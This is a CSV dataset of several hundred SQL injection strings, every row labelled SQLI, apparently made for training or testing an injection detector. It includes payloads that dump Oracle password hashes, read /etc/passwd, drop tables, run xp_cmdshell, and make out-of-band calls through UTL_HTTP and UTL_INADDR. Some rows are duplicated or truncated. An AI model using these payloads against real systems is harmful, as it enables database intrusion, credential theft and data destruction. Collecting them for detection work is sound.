payload,attack
"a"" order by 1-- #",SQLI
"a""and/*g*/456=678-- #",SQLI
"a""or/*g*/345=345-- #",SQLI
"345""%5d|//*|/a%5b""a",SQLI
"456""%5d|//a|/a%5b""a",SQLI
"345"")%5d|//*|/a%5bcontains(a,""b",SQLI
"456"")%5d|//a|/a%5bcontains(a,""b",SQLI
name from master..syslogins,SQLI
table_name+':'+column_name+':'+data_type from information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema',SQLI
"MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns",SQLI
LOAD_FILE('/etc/passwd'),SQLI
LOAD_FILE('/windows/win.ini'),SQLI
LOAD_FILE(0x2F6574632F706173737764),SQLI
LOAD_FILE(0x2f77696e646f77732f77696e2e696e69),SQLI
banner from v$version,SQLI
username from all_users,SQLI
table_name FROM all_tables,SQLI
column_name FROM all_tab_columns,SQLI
(select user from dual),SQLI
(select SYS.DATABASE_NAME from dual),SQLI
"(SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)",SQLI
"(SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)",SQLI
"(SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)",SQLI
"(SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)",SQLI
"(SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)",SQLI
"(SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)",SQLI
"(SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)",SQLI
"(SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)",SQLI
"(SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)",SQLI
"(SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)",SQLI
(select banner FROM v$version WHERE ROWNUM=1),SQLI
select user from dual,SQLI
select SYS.DATABASE_NAME from dual,SQLI
"SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1",SQLI
"SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1",SQLI
"SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2",SQLI
"SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2",SQLI
"SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3",SQLI
"SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3",SQLI
"SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1",SQLI
"SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2",SQLI
"SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1",SQLI
"SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2",SQLI
select banner FROM v$version WHERE ROWNUM=1,SQLI
1 waitfor delay '0:0:X'--,SQLI
1; waitfor delay '0:0:X'--,SQLI
1'; waitfor delay '0:0:X'--,SQLI
1); waitfor delay '0:0:X'--,SQLI
1)); waitfor delay '0:0:X'--,SQLI
1'); waitfor delay '0:0:X'--,SQLI
1')); waitfor delay '0:0:X'--,SQLI
"1 or benchmark(100000000,MD5(1))#",SQLI
"1' or benchmark(100000000,MD5(1))#",SQLI
"1) or benchmark(100000000,MD5(1))#",SQLI
"1') or benchmark(100000000,MD5(1))#",SQLI
"1)) or benchmark(100000000,MD5(1))#",SQLI
"1')) or benchmark(100000000,MD5(1))#",SQLI
1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--,SQLI
1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--,SQLI
1 waitfor delay '0:0:X'--,SQLI
1; waitfor delay '0:0:X'--,SQLI
1'; waitfor delay '0:0:X'--,SQLI
1); waitfor delay '0:0:X'--,SQLI
1)); waitfor delay '0:0:X'--,SQLI
1'); waitfor delay '0:0:X'--,SQLI
1')); waitfor delay '0:0:X'--,SQLI
"1 or benchmark(100000000,MD5(1))#",SQLI
"1' or benchmark(100000000,MD5(1))#",SQLI
"1) or benchmark(100000000,MD5(1))#",SQLI
"1') or benchmark(100000000,MD5(1))#",SQLI
"1)) or benchmark(100000000,MD5(1))#",SQLI
"1')) or benchmark(100000000,MD5(1))#",SQLI
1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--,SQLI
1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--b'1;DROP TABLE users',SQLI
"b""1'; DROP TABLE users-- 1""",SQLI
"b""' OR 1=1 -- 1""",SQLI
"b""' OR '1'='1""",SQLI
b'\xe2\x80\x99 or \xe2\x80\x981\xe2\x80\x99=\xe2\x80\x991',SQLI
"b""' or '1'='1""",SQLI
"b""'||utl_http.request('httP://192.168.1.1/')||'""",SQLI
"b""' || myappadmin.adduser('admin', 'newpass') || '""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i""",SQLI
"b""' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i""",SQLI
"b"")%20or%20('x'='x""",SQLI
b'%20or%201=1',SQLI
"b""; execute immediate 'sel' || 'ect us' || 'er'""",SQLI
"b'benchmark(10000000,MD5(1))#'",SQLI
b'update',SQLI
"b"";waitfor delay '0:0:__TIME__'--""",SQLI
b'1) or pg_sleep(__TIME__)--',SQLI
"b'||(elt(-3+5,bin(15),ord(10),hex(char(45))))'",SQLI
"b'hi"""") or (""""a""""=""""a""'",SQLI
b' or sleep(__TIME__)#',SQLI
b'pg_sleep(__TIME__)--',SQLI
b'*(|(objectclass=*))',SQLI
b'declare @q nvarchar (200) 0x730065006c00650063 ...',SQLI
b' or 0=0 #',SQLI
b'1) or sleep(__TIME__)#',SQLI
"b"") or ('a'='a""",SQLI
b'; exec xp_regread',SQLI
b'@var select @var as var into temp end --',SQLI
"b'1)) or benchmark(10000000,MD5(1))#'",SQLI
b'(||6)',SQLI
"b'a"""" or 3=3--""'",SQLI
"b' or benchmark(10000000,MD5(1))#'",SQLI
b'# from wapiti',SQLI
b' or 0=0 --',SQLI
"b""1 waitfor delay '0:0:10'--""",SQLI
"b"" or 'a'='a""",SQLI
b'hi or 1=1 --',SQLI
b'or a = a',SQLI
b'UNION ALL SELECT',SQLI
"b"") or sleep(__TIME__)='""",SQLI
"b')) or benchmark(10000000,MD5(1))#'",SQLI
"b""hi' or 'a'='a""",SQLI
b'or 1=1',SQLI
b'or 2 > 1',SQLI
"b')) or benchmark(10000000,MD5(1))#'",SQLI
"b""hi') or ('a'='a""",SQLI
b' or 3=3',SQLI
"b""));waitfor delay '0:0:__TIME__'--""",SQLI
"b""a' waitfor delay '0:0:10'--""",SQLI
"b'1;(load_file(char(47,101,116,99,47,112,97,115, ...'",SQLI
b'or%201=1',SQLI
b'1 or sleep(__TIME__)#',SQLI
b'or 1=1',SQLI
b' and 1 in (select var from temp)--',SQLI
"b"" or '7659'='7659""",SQLI
"b"" or 'text' = n'text'""",SQLI
"b""or 1=1 or ''='""",SQLI
b'declare @s varchar (200) select @s = 0x73656c6 ...',SQLI
"b""; exec master..xp_cmdshell 'ping 172.10.1.255'--""",SQLI
b'3.10E+17',SQLI
b' or pg_sleep(__TIME__)--',SQLI
"b""x' AND email IS NULL; --""",SQLI
"b""admin' or '""",SQLI
"b""or 'unusual' = 'unusual'""",SQLI
"b'1) or benchmark(10000000,MD5(1))#'",SQLI
b'\\x27UNION SELECT',SQLI
b'declare @s varchar(200) select @s = 0x77616974 ...',SQLI
b'tz_offset',SQLI
b'sqlvuln',SQLI
"b""));waitfor delay '0:0:__TIME__'--""",SQLI
b'or%201=1 --',SQLI
b'%2A%28%7C%28objectclass%3D%2A%29%29',SQLI
b'or a=a',SQLI
b') union select * from information_schema.tables',SQLI
b'PRINT @@variable',SQLI
b'or isNULL(1/0) /*',SQLI
"b'or ""a""=""a'",SQLI
b'(sqlvuln)',SQLI
"b""x' AND members.email IS NULL; --""",SQLI
b'or 1=1--',SQLI
"b'and 1=( if((load_file(char(110,46,101,120,11 ...'",SQLI
b'0x770061006900740066006F0072002000640065006C00 ...',SQLI
"b""%20'sleep%2050'""",SQLI
b'as',SQLI
b'1)) or pg_sleep(__TIME__)--',SQLI
b'/**/or/**/1/**/=/**/1',SQLI
b'union all select @@version--',SQLI
"b',@variable'",SQLI
b'(sqlattempt2)',SQLI
b'or (EXISTS)',SQLI
"b""t'exec master..xp_cmdshell 'nslookup www.googl ...""",SQLI
b'%20$(sleep%2050)',SQLI
"b'1 or benchmark(10000000,MD5(1))#'",SQLI
"b""%20or%20''='""",SQLI
b'||UTL_HTTP.REQUEST',SQLI
b'or pg_sleep(__TIME__)--',SQLI
"b""hi' or 'x'='x';""",SQLI
b') or sleep(__TIME__)=',SQLI
"b""or 'whatever' in ('whatever')""",SQLI
"b""; begin declare @var varchar(8000) set @var=' ...""",SQLI
"b""union select 1,load_file('/etc/passwd'),1,1,1;""",SQLI
b'0x77616974666F722064656C61792027303A303A313027 ...',SQLI
b'exec(@s)',SQLI
b') or pg_sleep(__TIME__)--',SQLI
b'union select',SQLI
b'or sleep(__TIME__)#',SQLI
b'select * from information_schema.tables--',SQLI
"b""a' or 1=1--""",SQLI
"b""a' or 'a' = 'a""",SQLI
b'declare @s varchar(22) select @s =',SQLI
b'or 2 between 1 and 3',SQLI
b'or a=a--',SQLI
"b""or '1'='1""",SQLI
b'|',SQLI
"b""or sleep(__TIME__)='""",SQLI
"b""or 1 --'""",SQLI
"b'or 0=0 #""'",SQLI
b' or isNULL(1/0) /*',SQLI
b'declare @s varchar (8000) select @s = 0x73656c ...',SQLI
b'a\xc2\x80\xc2\x98 or 1=1 --',SQLI
b'char%4039%41%2b%40SELECT',SQLI
b'order by',SQLI
b'bfilename',SQLI
b' having 1=1--',SQLI
"b') or benchmark(10000000,MD5(1))#'",SQLI
b' or username like char(37);',SQLI
"b"";waitfor delay '0:0:__TIME__'--""",SQLI
b' or 1=1--',SQLI
"b""x' AND userid IS NULL; --""",SQLI
b'*/*',SQLI
"b""or 'text' > 't'""",SQLI
b'(select top 1',SQLI
"b'or benchmark(10000000,MD5(1))#'",SQLI
"b"");waitfor delay '0:0:__TIME__'--""",SQLI
"b""a' or 3=3--""",SQLI
b' -- &password=',SQLI
b' group by userid having 1=1--',SQLI
"b"" or ''='""",SQLI
b'; exec master..xp_cmdshell',SQLI
b'%20or%20x=x',SQLI
"b')) or sleep(__TIME__)=""'",SQLI
b'0x730065006c0065006300740020004000400076006500 ...',SQLI
"b""hi' or 1=1 --""",SQLI
b') or pg_sleep(__TIME__)--',SQLI
"b""%20or%20'x'='x""",SQLI
"b"" or 'something' = 'some'+'thing'""",SQLI
b'1 or pg_sleep(__TIME__)--',SQLI
b'0 or 1=1',SQLI
b') or (a=a',SQLI
b'uni/**/on sel/**/ect',SQLI
b'%27%20or%201=1',SQLI
b')) or pg_sleep(__TIME__)--',SQLI
b'%7C',SQLI
"b""x' AND 1=(SELECT COUNT(*) FROM tabname); --""",SQLI
b'&apos;%20OR',SQLI
"b""; or '1'='1'""",SQLI
b'declare @q nvarchar (200) select @q = 0x770061 ...',SQLI
b'1 or 1=1',SQLI
"b""; exec ('sel' + 'ect us' + 'er')""",SQLI
b'23 OR 1=1',SQLI
"b""anything' OR 'x'='x""",SQLI
b'declare @q nvarchar (4000) select @q =',SQLI
b'or 0=0 --',SQLI
"b""||'6""",SQLI
b'1)) or sleep(__TIME__)#',SQLI
b'or 0=0 #',SQLI
b'select name from syscolumns where id = (sele ...',SQLI
b'hi or a=a',SQLI
b'*(|(mail=*))',SQLI
b'password:*/=1--',SQLI
"b"");waitfor delay '0:0:__TIME__'--\n""",SQLI
"b') or benchmark(10000000,MD5(1))#'",SQLI
b'UNION SELECT',SQLI
b'%2A%28%7C%28mail%3D%2A%29%29',SQLI
b'=+sqlvuln',SQLI
b'or 1=1 /*',SQLI
"b"")) or sleep(__TIME__)='""",SQLI
"b'or 1=1 or """"='",SQLI
b'or 1 in (select @@version)--',SQLI
b'union select * from users where login = char ...',SQLI
"b""x' or 1=1 or 'x'='y""",SQLI
b'\xc3\xa2\xc2\x80\xc2\x98 or 3=3 --',SQLI
b'@variable',SQLI
"b""or '1'='1'--""",SQLI
"b'a"" or 1=1--'",SQLI
b'//*',SQLI
b'%2A%7C',SQLI
b' or 0=0 --\n)) or pg_sleep(__TIME__)--',SQLI
b'?',SQLI
b'or 1/*',SQLI
b'!',SQLI
b'or a = a',SQLI
b'declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)',SQLI
b'declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)',SQLI
b'declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)',SQLI
b'declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)',SQLI
"b""' or 1=1""",SQLI
b'\x18 or 1=1 --',SQLI
"b""x' OR full_name LIKE '%Bob%""",SQLI
"b""'; exec master..xp_cmdshell 'ping 172.10.1.255'--""",SQLI
"b""'%20or%20''='""",SQLI
"b""'%20or%20'x'='x""",SQLI
"b""')%20or%20('x'='x""",SQLI
"b""' or 0=0 --""",SQLI
"b""' or 0=0 #""",SQLI
"b'or 0=0 #""'",SQLI
"b""' or 1=1--""",SQLI
"b""' or '1'='1'--""",SQLI
"b""' or 1 --'""",SQLI
b'or 1=1--',SQLI
"b""' or 1=1 or ''='""",SQLI
"b'or 1=1 or """"='",SQLI
"b""' or a=a--""",SQLI
b'or a=a',SQLI
"b""') or ('a'='a""",SQLI
"b""'hi' or 'x'='x';""",SQLI
"b""' or username like '%""",SQLI
"b""' or uname like '%""",SQLI
"b""' or userid like '%""",SQLI
"b""' or uid like '%""",SQLI
"b""' or user like '%""",SQLI
"b""'; exec master..xp_cmdshell""",SQLI
"b""'; exec xp_regread""",SQLI
"b""t'exec master..xp_cmdshell 'nslookup www.google.com'--""",SQLI
b'--sp_password',SQLI
"b""' UNION SELECT""",SQLI
"b""' UNION ALL SELECT""",SQLI
"b""' or (EXISTS)""",SQLI
"b""' (select top 1""",SQLI
"b""'||UTL_HTTP.REQUEST""",SQLI
b'1;SELECT%20*',SQLI
"b'<>""\'%;)(&+'",SQLI
"b""'%20or%201=1""",SQLI
"b""'sqlattempt1""",SQLI
"b""' or ''='""",SQLI
"b""' or 3=3""",SQLI
b'\x18 or 3=3 --',SQLI
"b""x' AND 1=(SELECT COUNT(*) FROM tabname);--""",SQLI
b'1+union+select+abc+from+abc',SQLI
"b""'union select 1,load_file(0x2f6574632f706173737764),3 from users--""",SQLI
"b'0^(locate(0x61,(select id from users where num=1),1)=1)'",SQLI
"b""x';INSERT+INTO+aa('1')+values('1')--""",SQLI
"b""x';UPDATE+aa+set+1='2'--""",SQLI
"b'1+and+convert(int,@@servername)--'",SQLI
"b""a';exec+master..xp_cmdshell+'ping'--""",SQLI
"b""a';EXEC+master.dbo.xp_cmdshell+'ping'""",SQLI
"b'\';/*,1*/ EXEC /*,1*/ master..xp_cmdshell /*,1*/ ""ping 127.0.0.1"" /*,1*/--'",SQLI
"b'\';/*&iid=1*/ EXEC/*&iid=1*/ master..xp_cmdshell /*&iid=1*/ ""ping 127.0.0.1"" /*&iid=1*/--'",SQLI
"b""'1+or+1=1--""",SQLI
"b""'1+or+'ab'='ab1""",SQLI
"b""admin'--""",SQLI
"b""'--""",SQLI
"b""admin'/*""",SQLI
"b""admin'# """,SQLI
"b""1'<99# """,SQLI
"b""'=0=1# """,SQLI
"b""'<=>0# """,SQLI
